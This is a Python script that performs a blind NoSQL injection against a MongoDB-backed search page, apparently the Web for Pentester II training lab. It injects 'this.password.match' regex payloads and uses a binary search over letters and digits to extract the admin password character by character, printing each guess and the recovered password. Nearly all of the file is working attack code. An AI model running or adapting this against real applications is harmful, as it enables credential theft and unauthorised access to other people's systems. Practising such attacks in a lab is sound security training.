import requests, sys, string
from bs4 import BeautifulSoup


def get_request(url_to_connect):
    """
    Send a get request to the server and receive a response back

    :param url_to_connect: (string) a link to connect to a sever
    :return: a BeautifulSoup object
    """
    resp = requests.get(url_to_connect)
    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup


def check_user(user, soup_object):
    """
    To check if user exists in the table in the soup object

    :param user: (string) name of user
    :param soup_object: (object) soup object that contains table
    :return: True if user is found in table, False if not found in table
    """

    if user in soup_object.find('table').getText():
        return True
    else:
        return False


def binary_search(alphanumeric_list, left, right, url, pwd):
    """
    Recursive function to perform binary search to inject SQL statements to a mongolDb database
    This function finds a character that the password has then returns that character

    :param alphanumeric_list: (list) list of all the ascii letters and digits
    :param left: (int) starting index
    :param right: (int) ending index
    :param url: (string) url to connect to WFP2 server
    :param pwd: (string) already found password to be passed to the server as part of the URL's parameter
    :return: (string) a character of password
    """

    # String that will be passed with the URL to the server
    binary_search_string = "admin' %26%26 this.password.match(/^{}[{}]/)//%00"

    # Find mid-point to cut the list of ascii characters and digits in half
    mid = left + (right - left) // 2

    # Base case for recursive function
    if right == mid or left == mid:
        return alphanumeric_list[mid]

    soup_obj = get_request(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]))

    # Now do recursion
    if check_user('admin', soup_obj):
        print(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]), " Matched!")
        # Keep checking left if found a match
        return binary_search(alphanumeric_list, left, mid, url, pwd)
    else:
        print(url + binary_search_string.format(pwd, alphanumeric_list[left:mid]), " No match")
        # If no matches found in the left then check the right
        return binary_search(alphanumeric_list, mid, right, url, pwd)


# This is the main function, everything starts here
def blind_sql_binary_search():
    wfp2_site = sys.argv[1]
    url = f'''http://{wfp2_site}/mongodb/example2/?search='''
    alpha_numeric = string.ascii_letters + string.digits
    pwd = ''
    is_completed = "admin' %26%26 this.password.match(/^{}[a-zA-Z0-9]/)//%00"
    done = False

    while not done:
        result = binary_search(alpha_numeric, 0, len(alpha_numeric) - 1, url, pwd)
        pwd += result
        print('Current pass: ', pwd)

        # check to see if password is completed
        soup = get_request(url + is_completed.format(pwd))
        if not check_user('admin', soup):
            print("Password found!")
            done = True

    return pwd


complete_pass = blind_sql_binary_search()
print('Complete pass: ', complete_pass)
